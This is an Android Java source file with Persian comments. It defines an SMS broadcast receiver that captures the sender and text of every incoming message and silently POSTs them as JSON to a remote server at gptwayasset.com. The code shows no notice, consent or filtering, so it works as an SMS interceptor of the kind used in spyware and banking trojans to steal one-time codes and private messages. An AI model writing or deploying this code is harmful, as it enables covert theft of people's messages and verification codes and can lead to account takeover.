import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;
import android.os.AsyncTask;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // دریافت پیامک‌ها
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
            String sender = smsMessage.getOriginatingAddress();
            String message = smsMessage.getMessageBody();

            Log.d("SMS_RECEIVED", "📩 پیامک از " + sender + ": " + message);

            // ارسال پیامک دریافت‌شده به سرور پایتونی
            new SendSmsToServer().execute(sender, message);
        }
    }
}

class SendSmsToServer extends AsyncTask<String, Void, Void> {
    @Override
    protected Void doInBackground(String... params) {
        try {
            URL url = new URL("https://gptwayasset.com/sms/index.php");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("sender", params[0]);
            json.put("message", params[1]);

            OutputStream os = conn.getOutputStream();
            os.write(json.toString().getBytes("UTF-8"));
            os.close();

            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
